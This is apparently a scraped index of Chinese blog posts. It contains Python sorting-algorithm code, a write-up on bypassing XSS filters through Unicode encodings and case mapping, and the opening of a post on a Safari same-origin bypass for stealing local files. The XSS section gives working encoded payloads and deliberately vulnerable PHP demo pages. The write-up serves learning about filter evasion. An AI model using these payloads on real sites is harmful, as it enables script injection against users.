class=\"number\">0</span>:</span><br><span class=\"line\">      lists[j+<span class=\"number\">1</span>] = lists[j]</span><br><span class=\"line\">      j -= <span class=\"number\">1</span></span><br><span class=\"line\">    lists[j+<span class=\"number\">1</span>] = tmp</span><br><span class=\"line\">  <span class=\"keyword\">return</span> lists</span><br></pre></td></tr></table></figure>\n<ul>\n<li>数据交换</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">insert_sort</span><span class=\"params\">(lists)</span>:</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(lists)):</span><br><span class=\"line\">    j = i<span class=\"number\">-1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> lists[j]&gt;lists[j+<span class=\"number\">1</span>] <span class=\"keyword\">and</span> j&gt;=<span class=\"number\">0</span>:</span><br><span class=\"line\">      <span class=\"comment\"># swap</span></span><br><span class=\"line\">      lists[j+<span class=\"number\">1</span>], lists[j] = lists[j], lists[j+<span class=\"number\">1</span>]</span><br><span class=\"line\">      j -= <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> lists</span><br></pre></td></tr></table></figure>\n<h2 id=\"希尔排序\"><a href=\"#希尔排序\" class=\"headerlink\" title=\"希尔排序\"></a>希尔排序</h2><blockquote>\n<p>不稳定排序， 时间复杂度: O(N^(3/2))</p>\n</blockquote>\n<p>希尔排序(Shell Sort)是插入排序的一种，它是针对直接插入排序算法的改进。该方法又称缩小增量排序，因DL．Shell于1959年提出而得名。</p>\n<p>希尔排序实质上是一种分组插入方法。它的基本思想是：对于n个待排序的数列，取一个小于n的整数gap(gap被称为步长)将待排序元素分成若干个组子序列，所有距离为gap的倍数的记录放在同一个组中；然后，对各组内的元素进行直接插入排序。 这一趟排序完成之后，每一个组的元素都是有序的。然后减小gap的值，并重复执行上述的分组和排序。重复这样的操作，当gap=1时，整个数列就是有序的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">shell_sort</span><span class=\"params\">(lists)</span>:</span></span><br><span class=\"line\">  gap = len(lists) / <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> gap &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(gap, len(lists)):</span><br><span class=\"line\">      <span class=\"comment\"># 同组直接插入排序</span></span><br><span class=\"line\">      j = i - gap</span><br><span class=\"line\">      <span class=\"keyword\">while</span> lists[j] &gt; lists[j+gap] <span class=\"keyword\">and</span> j&gt;=<span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"comment\"># swap</span></span><br><span class=\"line\">        lists[j+gap], lists[j] = lists[j], lists[j+gap]</span><br><span class=\"line\">        j -= gap</span><br><span class=\"line\">    gap /= <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> lists</span><br></pre></td></tr></table></figure>\n<h2 id=\"归并排序\"><a href=\"#归并排序\" class=\"headerlink\" title=\"归并排序\"></a>归并排序</h2><blockquote>\n<p>稳定排序, 时间复杂度: O(NlogN)</p>\n</blockquote>\n<p>将两个的有序数列合并成一个有序数列，我们称之为”<strong>归并</strong>“。<br>归并排序(Merge Sort)就是利用归并思想对数列进行排序。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">merge</span><span class=\"params\">(left, right)</span>:</span></span><br><span class=\"line\">  res = []</span><br><span class=\"line\">  i, j = <span class=\"number\">0</span>, <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> i&lt;len(left) <span class=\"keyword\">and</span> j&lt;len(right):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> left[i]&lt;right[j]:</span><br><span class=\"line\">      res.append(left[i])</span><br><span class=\"line\">      i += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">      res.append(right[j])</span><br><span class=\"line\">      j += <span class=\"number\">1</span></span><br><span class=\"line\">  res.extend(left[i:])</span><br><span class=\"line\">  res.extend(right[j:])</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">merge_sort</span><span class=\"params\">(lists)</span>:</span></span><br><span class=\"line\">  lens = len(lists)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> lens &lt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lists</span><br><span class=\"line\">  num = lens / <span class=\"number\">2</span></span><br><span class=\"line\">  left = merge_sort(lists[:num])</span><br><span class=\"line\">  right = merge_sort(lists[num:])</span><br><span class=\"line\">  <span class=\"keyword\">return</span> merge(left, right)</span><br></pre></td></tr></table></figure>\n<h2 id=\"快速排序\"><a href=\"#快速排序\" class=\"headerlink\" title=\"快速排序\"></a>快速排序</h2><blockquote>\n<p>不稳定排序，时间复杂度: O(NlogN)</p>\n</blockquote>\n<p>快速排序(Quick Sort)使用分治法策略，它的基本思想是：选择一个基准数，通过一趟排序将要排序的数据分割成独立的两部分；其中一部分的所有数据都比另外一部分的所有数据都要小。然后，再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。</p>\n<p>快速排序流程：<br>(1) 从数列中挑出一个基准值。<br>(2) 将所有比基准值小的摆放在基准前面，所有比基准值大的摆在基准的后面(相同的数可以到任一边)；在这个分区退出之后，该基准就处于数列的中间位置。<br>(3) 递归地把”基准值前面的子数列”和”基准值后面的子数列”进行排序。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">quick_sort</span><span class=\"params\">(lists, l, r)</span>:</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> l &gt;= r:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lists</span><br><span class=\"line\"></span><br><span class=\"line\">  key = lists[l]</span><br><span class=\"line\">  low = l</span><br><span class=\"line\">  high = r</span><br><span class=\"line\">  <span class=\"keyword\">while</span> l &lt; r:</span><br><span class=\"line\">    <span class=\"keyword\">while</span> l&lt;r <span class=\"keyword\">and</span> lists[r] &gt;= key:</span><br><span class=\"line\">      r -= <span class=\"number\">1</span></span><br><span class=\"line\">    lists[l] = lists[r]</span><br><span class=\"line\">    <span class=\"keyword\">while</span> l&lt;r <span class=\"keyword\">and</span> lists[l] &lt; key:</span><br><span class=\"line\">      l += <span class=\"number\">1</span></span><br><span class=\"line\">    lists[r] = lists[l]</span><br><span class=\"line\"></span><br><span class=\"line\">  lists[l] = key</span><br><span class=\"line\">  quick_sort(lists, low, l<span class=\"number\">-1</span>)</span><br><span class=\"line\">  quick_sort(lists, l+<span class=\"number\">1</span>, high)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> lists</span><br></pre></td></tr></table></figure>\n<h2 id=\"基数排序\"><a href=\"#基数排序\" class=\"headerlink\" title=\"基数排序\"></a>基数排序</h2><blockquote>\n<p>稳定排序, 时间复杂度: O(N)</p>\n</blockquote>\n<p>基数排序(Radix Sort)是<strong>桶排序</strong>的扩展，它的基本思想是：将整数按位数切割成不同的数字，然后按每个位数分别比较。<br>具体做法是：将所有待比较数值统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后, 数列就变成一个有序序列。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">radix_sort</span><span class=\"params\">(lists, radix=<span class=\"number\">10</span>)</span>:</span></span><br><span class=\"line\">    k = int(math.ceil(math.log(max(lists), radix)))</span><br><span class=\"line\">    bucket = [[] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(radix)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(k):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> lists:</span><br><span class=\"line\">            bucket[j/(radix**(i)) % radix].append(j)</span><br><span class=\"line\">        <span class=\"keyword\">del</span> lists[:]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> z <span class=\"keyword\">in</span> bucket:</span><br><span class=\"line\">            lists.extend(z)</span><br><span class=\"line\">            <span class=\"keyword\">del</span> z[:]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lists</span><br></pre></td></tr></table></figure>\n<h2 id=\"堆排序\"><a href=\"#堆排序\" class=\"headerlink\" title=\"堆排序\"></a>堆排序</h2><blockquote>\n<p>不稳定排序，时间复杂度: O(NlogN)</p>\n</blockquote>\n<p>堆排序(Heap Sort)是指利用堆这种数据结构所设计的一种排序算法。最大堆通常被用来进行”升序”排序，而最小堆通常被用来进行”降序”排序。</p>\n<p>最大堆进行升序排序的基本思想：<br>① 初始化堆：将数列a[1…n]构造成最大堆。<br>② 交换数据：将a[1]和a[n]交换，使a[n]是a[1…n]中的最大值；然后将a[1…n-1]重新调整为最大堆。 接着，将a[1]和a[n-1]交换，使a[n-1]是a[1…n-1]中的最大值；然后将a[1…n-2]重新调整为最大值。 依次类推，直到整个数列都是有序的。</p>\n<p>“数组实现的二叉堆的性质”,在第一个元素的索引为 0 的情形中：<br>性质一：索引为i的左孩子的索引是 (2<em>i+1);<br>性质二：索引为i的左孩子的索引是 (2</em>i+2);<br>性质三：索引为i的父结点的索引是 floor((i-1)/2);</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">adjust_heap</span><span class=\"params\">(lists, i, size)</span>:</span></span><br><span class=\"line\">  lchild = <span class=\"number\">2</span> * i + <span class=\"number\">1</span></span><br><span class=\"line\">  rchild = <span class=\"number\">2</span> * i + <span class=\"number\">2</span></span><br><span class=\"line\">  max = i</span><br><span class=\"line\">  <span class=\"keyword\">if</span> i &lt; size / <span class=\"number\">2</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> lchild &lt; size <span class=\"keyword\">and</span> lists[lchild] &gt; lists[max]:</span><br><span class=\"line\">      max = lchild</span><br><span class=\"line\">    <span class=\"keyword\">if</span> rchild &lt; size <span class=\"keyword\">and</span> lists[rchild] &gt; lists[max]:</span><br><span class=\"line\">      max = rchild</span><br><span class=\"line\">    <span class=\"keyword\">if</span> max != i:</span><br><span class=\"line\">      lists[max], lists[i] = lists[i], lists[max]</span><br><span class=\"line\">      adjust_heap(lists, max, size)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">build_heap</span><span class=\"params\">(lists, size)</span>:</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(size/<span class=\"number\">2</span><span class=\"number\">-1</span>, <span class=\"number\">-1</span>, <span class=\"number\">-1</span>):</span><br><span class=\"line\">    adjust_heap(lists, i, size)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">heap_sort</span><span class=\"params\">(lists)</span>:</span></span><br><span class=\"line\">  size = len(lists)</span><br><span class=\"line\">  build_heap(lists, size)</span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(size<span class=\"number\">-1</span>, <span class=\"number\">-1</span>, <span class=\"number\">-1</span>):</span><br><span class=\"line\">    lists[<span class=\"number\">0</span>], lists[i] = lists[i], lists[<span class=\"number\">0</span>]</span><br><span class=\"line\">    adjust_heap(lists, <span class=\"number\">0</span>, i)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> lists</span><br></pre></td></tr></table></figure>","categories":["数据结构和算法"],"tags":["排序"]},{"title":"unicode绕过xss","url":"http://www.beesfun.com/2017/08/07/unicode绕过xss/","content":"<p>无意间看到一篇讲解unicode绕过xss的文章<a href=\"http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html\" target=\"_blank\" rel=\"noopener\">Xssing Web With Unicodes</a>，内容比较基础，记录下，顺便巩固下unicode的相关知识:)<br><a id=\"more\"></a></p>\n<h2 id=\"unicode基础知识\"><a href=\"#unicode基础知识\" class=\"headerlink\" title=\"unicode基础知识\"></a>unicode基础知识</h2><p>简单来说，unicode 是字符集，utf-8,utf-16,utf-32是编码规则。<br><a href=\"https://unicode-table.com/\" target=\"_blank\" rel=\"noopener\">unicode 字符集: ttps://unicode-table.com/</a></p>\n<h3 id=\"UTF-8-1-4-byte\"><a href=\"#UTF-8-1-4-byte\" class=\"headerlink\" title=\"UTF-8 (1-4 byte)\"></a>UTF-8 (1-4 byte)</h3><p>utf-8是可变变长编码，将一个unicode码位编码成1-4字节。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U+ 0000 ~ U+ 007F: 0XXXXXXX</span><br><span class=\"line\">U+ 0080 ~ U+ 07FF: 110XXXXX 10XXXXXX</span><br><span class=\"line\">U+ 0800 ~ U+ FFFF: 1110XXXX 10XXXXXX 10XXXXXX</span><br><span class=\"line\">U+10000 ~ U+1FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX</span><br></pre></td></tr></table></figure>\n<p>Example :</p>\n<ul>\n<li>Character “A” =&gt; 0x41</li>\n<li>Character “ſ”  =&gt; 0xC4 0xBF</li>\n<li>Character “ಓ” =&gt; 0xE0 0xB2 0x93</li>\n<li>Character “𪨶” =&gt; 0xF0 0xAA 0xA8 0xB6</li>\n</ul>\n<p>例如 “ſ”查unicode字符集为 <code>\\u+017f</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000 0001 0111 1111  &lt;- unicode 二进制</span><br><span class=\"line\">110+00100 10+111111  &lt;- utf-8 编码(二进制)，对应上面第二行</span><br><span class=\"line\">1100 0100 1011 1111  &lt;- 0Xc4 0xbf</span><br></pre></td></tr></table></figure>\n<p>在线unicode转utf-8工具: <a href=\"http://www.ltg.ed.ac.uk/~richard/utf-8.cgi?input=017f&amp;mode=hex\" target=\"_blank\" rel=\"noopener\">http://www.ltg.ed.ac.uk/~richard/utf-8.cgi?input=017f&amp;mode=hex</a></p>\n<h3 id=\"UTF-16-2byte\"><a href=\"#UTF-16-2byte\" class=\"headerlink\" title=\"UTF-16 (2byte)\"></a>UTF-16 (2byte)</h3><ul>\n<li><p>UTF-16be (be- Big Endian) [Left to Right Byte Order ]</p>\n<p>Example :</p>\n<ul>\n<li>Character “A” =&gt; 0x00 0x41</li>\n</ul>\n</li>\n<li><p>UTF-16le (le- Little Endian) [Right to Left Byte Order]</p>\n<p>Example :</p>\n<ul>\n<li>Character “A” =&gt; 0x41 0x00</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"UTF-32-4-byte\"><a href=\"#UTF-32-4-byte\" class=\"headerlink\" title=\"UTF-32 (4 byte)\"></a>UTF-32 (4 byte)</h3><ul>\n<li><p>UTF-32be (be- Big Endian) [Left to Right Byte Order]</p>\n<p>Example :</p>\n<ul>\n<li>Character “A” =&gt; 0x00 0x00 0x00 0x41</li>\n</ul>\n</li>\n<li><p>UTF-32le (le- Little Endian) [Right to Left Byte Order]</p>\n<p>Example :</p>\n<ul>\n<li>Character “A” =&gt; 0x41 0x00 0x00 0x00</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"unicode绕过\"><a href=\"#unicode绕过\" class=\"headerlink\" title=\"unicode绕过\"></a>unicode绕过</h2><h3 id=\"简单编码绕过\"><a href=\"#简单编码绕过\" class=\"headerlink\" title=\"简单编码绕过 :\"></a>简单编码绕过 :</h3><p><a href=\"http://rakeshmane.com/lab/unicode/xss.php?x=payload&amp;charset=utf-8\" target=\"_blank\" rel=\"noopener\">http://rakeshmane.com/lab/unicode/xss.php?x=payload&amp;charset=utf-8</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">header(<span class=\"string\">'X-XSS-Protection: 0'</span>);</span><br><span class=\"line\">header(<span class=\"string\">'Content-Type: text/html; charset='</span>.$_GET[<span class=\"string\">'charset'</span>]);</span><br><span class=\"line\">highlight_string(file_get_contents(<span class=\"keyword\">__FILE__</span>, <span class=\"keyword\">true</span>));</span><br><span class=\"line\">$x=$_GET[<span class=\"string\">'x'</span>];</span><br><span class=\"line\">$x=preg_replace(<span class=\"string\">'/&lt;\\w+/'</span>, <span class=\"string\">''</span>, $x);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $x;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这个比较简单，设置字符集为 utf-16 或 utf-32可以绕过<code>preg_replace</code>检测</p>\n<ul>\n<li><p>设置编码为utf-16大端模式:</p>\n<p><code>x=%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00&amp;charset=utf-16be</code></p>\n</li>\n<li><p>设置编码为utf-32</p>\n<p><code>x=%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E&amp;charset=UTF-32</code></p>\n<p>看paylaod可以发现 最前面多了一个 %00，UTF-32是4字节编码，”&lt;”编码为”%00%00%00%3C”, 前面多加的一个 %00, 是为了匹配服务器返回的页面内容为4的整数倍，这样浏览器通过utf-32编码页面内容才能正确渲染提供的payload,触发xss,实际情况需要添加多少个 %00 来满足4的整数倍，视具体情况而定。</p>\n<img src=\"/2017/08/07/unicode绕过xss/001.png\">\n</li>\n</ul>\n<p>当没有指定编码模式(大端，小端)时，默认情况下UTF-32为大端模式，UTF-16为小端模式。</p>\n<h3 id=\"滥用unicode映射\"><a href=\"#滥用unicode映射\" class=\"headerlink\" title=\"滥用unicode映射\"></a>滥用unicode映射</h3><p>有些应用为了更好的兼容性，将unicode字符映射为大写或小写英文字母，作则给了一段nodejs代码去获取这些映射关系。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highNumber=<span class=\"number\">65000</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;highNumber;i++)&#123;</span><br><span class=\"line\">\tx=<span class=\"string\">\"\"</span></span><br><span class=\"line\">\ty=<span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"string\">\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\\"/?&gt;&lt;';:.,|\\\\+=-_*&amp;^%$#@!~`\"</span>.includes(<span class=\"built_in\">String</span>.fromCharCode(i).toLowerCase()))</span><br><span class=\"line\">\t\tx=<span class=\"built_in\">String</span>.fromCharCode(i).toLowerCase()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"string\">\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\\"/?&gt;&lt;';:.,|\\\\+=-_*&amp;^%$#@!~`\"</span>.includes(<span class=\"built_in\">String</span>.fromCharCode(i).toUpperCase()))</span><br><span class=\"line\">\t\ty=<span class=\"built_in\">String</span>.fromCharCode(i).toUpperCase()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>((x!=<span class=\"string\">\"\"</span>||y!=<span class=\"string\">\"\"</span>)&amp;&amp;!(<span class=\"string\">\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\\"/?&gt;&lt;';:.,|\\\\+=-_*&amp;^%$#@!~`\"</span>.includes(<span class=\"built_in\">String</span>.fromCharCode(i))))</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">\" \"</span>+i+<span class=\"string\">\" Original : \"</span>+<span class=\"built_in\">String</span>.fromCharCode(i)+<span class=\"string\">\" [\\\\u\"</span>+(i).toString(<span class=\"number\">16</span>)+<span class=\"string\">\"] LowerCase : \"</span>+x+<span class=\"string\">\" UpperCase : \"</span>+y)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>得到如下结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">305 Original : ı [\\u131] LowerCase :  UpperCase : I</span><br><span class=\"line\">383 Original : ſ [\\u17f] LowerCase :  UpperCase : S</span><br><span class=\"line\">8490 Original : K [\\u212a] LowerCase : k UpperCase :</span><br><span class=\"line\">64261 Original : ﬅ [\\ufb05] LowerCase :  UpperCase : ST</span><br><span class=\"line\">64262 Original : ﬆ [\\ufb06] LowerCase :  UpperCase : ST</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>demo</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">header(<span class=\"string\">'Content-Type: text/html; charset=UTF-8'</span>);</span><br><span class=\"line\">header(<span class=\"string\">'X-XSS-Protection: 0'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Security-Policy\"</span> content=<span class=\"string\">\"default-src 'none'; script-src 'self';\"</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">highlight_string(file_get_contents(<span class=\"keyword\">__FILE__</span>, <span class=\"keyword\">true</span>));</span><br><span class=\"line\">$x=$_GET[<span class=\"string\">'x'</span>];</span><br><span class=\"line\">$x=str_ireplace(<span class=\"string\">'$'</span>,<span class=\"string\">''</span>,$x); <span class=\"comment\">// Use it to bypass WAF,I know it's annoying but I can't disable it :P</span></span><br><span class=\"line\">$x=str_ireplace(<span class=\"string\">'&lt;script'</span>,<span class=\"string\">'BLOCKED'</span>,$x);</span><br><span class=\"line\">$x = mb_convert_case($x, MB_CASE_UPPER);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $x;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>源码中使用<code>mb_convert_case</code>去转换字符，默认用utf-8编码，从上面的unicode映射可知<code>ſ [\\u17f]</code>映射为大写字母<code>S</code>可以，以此来绕过<code>str_ireplace</code>的检测, <code>ſ [\\u17f]</code>utf-8编码为0xc40xbf</p>\n<p>Paylaod: <code>x=&lt;%C5%BFcript/src=./1&gt;&lt;/script&gt;</code></p>\n<p>​</p>\n</li>\n</ul>\n","categories":["Web安全"],"tags":["XSS","unicode"]},{"title":"绕过Safari同源策略，偷取本地文件","url":"http://www.beesfun.com/2017/08/07/绕过Safari同源策略，偷取本地文件/","content":"<p>国外研究者<a href=\"https://twitter.com/i_bo0om\" target=\"_blank\" rel=\"noopener\">Bo0om</a>公开了一种利用Safari同源策略绕过，读取本地文件并上传至远程服务器的攻击手法，并给出了PoC, 地址: <a href=\"https://github.com/Bo0oM/Safiler\" target=\"_blank\" rel=\"noopener\">https://github.com/Bo0oM/Safiler</a>。一次有效的攻击，需要用户使用<code>Safari</code>浏览器<code>本地读取(file://)</code>恶意文档文件，因此攻击的范围是有限的，但是攻击手法中绕过同源策略和读取本地文件两种方式还是值得学习和研究的。</p>\n<a id=\"more\"></a>\n<h2 id=\"Safari-同源策略绕过\"><a href=\"#Safari-同源策略绕过\" class=\"headerlink\" title=\"Safari 同源策略绕过\"></a>Safari 同源策略绕过</h2><p>受同源策略的限制，网页中用<code>XMLHttpRequest</code>对象读取本地文件是被禁止的，从错误信息中可以看出Safari浏览器跨源请求仅仅支持HTTP,但实际情况却并非如此。</p>\n<img src=\"/2017/08/07/绕过Safari同源策略，偷取本地文件/002.png\">\n<p>当Safari浏览器访问本地文件时，并不执行同源策略，用file协议打开一个HTML文件，包含在文件内的JavaScript代码可以绕过同源策略, 访问本地或远程文件。这样就可以做到读取本地文件，然后将文件内容发送给远程服务器了。</p>\n<img src=\"/2017/08/07/绕过Safari同源策略，偷取本地文件/003.png\">\n<p>这个问题15年就有报道过，至今苹果也没有处理，可能是，默认情况下javascript不能列举本地目录，影响范围有限。但是结合苹果系统自身的特性，利用<code>.DS_Store</code>文件来读取文件夹目录，这样攻击效果就很可观了，这也是本次介绍的攻击方式中一个值得研究的利用手段。</p>\n<h2 id=\"读取本地文件\"><a href=\"#读取本地文件\" class=\"headerlink\" title=\"读取本地文件\"></a>读取本地文件</h2><p><code>.DS_store</code>(Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。默认情况下，Mac OS 